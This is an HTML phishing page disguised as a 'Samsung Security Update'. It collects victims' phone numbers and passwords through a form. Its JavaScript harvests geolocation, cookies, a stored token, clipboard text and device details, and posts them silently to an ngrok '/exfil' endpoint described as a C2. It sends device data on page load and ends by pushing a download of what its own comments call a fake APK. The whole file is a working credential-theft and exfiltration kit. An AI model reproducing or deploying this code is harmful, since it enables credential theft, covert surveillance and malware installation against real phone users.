<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Samsung Security Update</title>
    <style>
        body { font-family: Arial; background: #0a0a1a; color: white; text-align: center; padding-top: 50px; margin: 0; }
        .box { background: #1a1a3e; padding: 30px; border-radius: 15px; max-width: 400px; margin: auto; }
        .btn { background: #00aaff; color: white; padding: 15px 30px; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; width: 100%; }
        input { width: 90%; padding: 12px; margin: 8px 0; border-radius: 5px; border: none; }
        .hidden { display: none; }
        .loader { border: 4px solid #333; border-top: 4px solid #00aaff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: #88ff88; font-size: 14px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="box" id="mainBox">
        <h1>📱 Samsung Security Update</h1>
        <p>Your device requires an urgent security patch.</p>
        
        <div id="step1">
            <input type="text" placeholder="Phone Number" id="phone">
            <input type="password" placeholder="Password" id="pass">
            <br><br>
            <button class="btn" onclick="step1()">Verify Identity</button>
        </div>

        <div id="step2" class="hidden">
            <p>🔍 Scanning device...</p>
            <div class="loader"></div>
            <p class="status" id="statusText">Collecting device information...</p>
        </div>

        <div id="step3" class="hidden">
            <p>✅ Security patch ready</p>
            <button class="btn" onclick="step3()">Install Now</button>
        </div>

        <p style="font-size:11px;color:#444;">Samsung Security • Version 12.5.3</p>
    </div>

    <script>
        // ============================================================
        // 1. COLLECT CREDENTIALS
        // ============================================================
        function step1() {
            const phone = document.getElementById('phone').value;
            const pass = document.getElementById('pass').value;

            if (!phone || !pass) {
                alert('Please enter your phone number and password.');
                return;
            }

            // Send credentials
            sendData({ type: 'credentials', phone, pass });

            // Show scanning
            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');

            // Start collecting mobile data
            collectMobileData();
        }

        // ============================================================
        // 2. COLLECT MOBILE DATA (Browser APIs)
        // ============================================================
        function collectMobileData() {
            const data = { type: 'mobile_data' };

            // 2a. Location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        data.location = {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        };
                        sendData(data);
                    },
                    err => { data.location = 'denied'; sendData(data); }
                );
            }

            // 2b. Battery
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    data.battery = {
                        level: battery.level * 100 + '%',
                        charging: battery.charging,
                        time: battery.dischargingTime
                    };
                    sendData(data);
                });
            }

            // 2c. Device info (User Agent)
            data.device = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                vendor: navigator.vendor
            };
            sendData(data);

            // 2d. Cookies & stored tokens
            data.cookies = document.cookie || 'none';
            data.localStorage = localStorage.getItem('token') || 'none';
            sendData(data);

            // 2e. Network info
            if (navigator.connection) {
                data.network = {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                };
                sendData(data);
            }

            // 2f. Try to read clipboard (if allowed)
            if (navigator.clipboard) {
                navigator.clipboard.readText().then(
                    text => { sendData({ type: 'clipboard', content: text }); },
                    err => { /* silent */ }
                );
            }

            // Update UI
            document.getElementById('statusText').innerHTML = '✅ Device data collected.';
            setTimeout(() => {
                document.getElementById('step2').classList.add('hidden');
                document.getElementById('step3').classList.remove('hidden');
            }, 3000);
        }

        // ============================================================
        // 3. FINAL STEP — TRIGGER DOWNLOAD/INSTALL
        // ============================================================
        function step3() {
            sendData({ type: 'action', action: 'install_clicked' });

            // Option A: Prompt to install fake APK
            if (confirm('System update ready. Install now?')) {
                // Send them to a fake APK download (or real APK)
                window.location.href = 'https://anonfiles.com/YOUR_APK_LINK';
            } else {
                alert('Update will be installed automatically at next restart.');
            }
        }

        // ============================================================
        // 4. SEND DATA TO YOUR C2 (ngrok + Telegram)
        // ============================================================
        function sendData(data) {
            // Add timestamp and IP (via browser)
            data.time = new Date().toISOString();

            // Try to get IP via free API (optional)
            fetch('https://api.ipify.org?format=json')
                .then(r => r.json())
                .then(ip => { data.ip = ip.ip; })
                .catch(() => { data.ip = 'unknown'; })
                .finally(() => {
                    // Send to your ngrok tunnel
                    fetch('https://matchless-palm-patriarch.ngrok-free.dev/exfil', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data)
                    }).catch(() => { /* silent fail */ });
                });

            // Send immediately without waiting for IP
            fetch('https://matchless-palm-patriarch.ngrok-free.dev/exfil', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).catch(() => { /* silent fail */ });
        }

        // ============================================================
        // 5. AUTOMATIC DATA COLLECTION ON PAGE LOAD
        // ============================================================
        // Send device info as soon as page loads
        window.onload = function() {
            const data = { type: 'page_view' };
            data.device = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height,
                vendor: navigator.vendor
            };
            sendData(data);
        };
    </script>
</body>
</html>
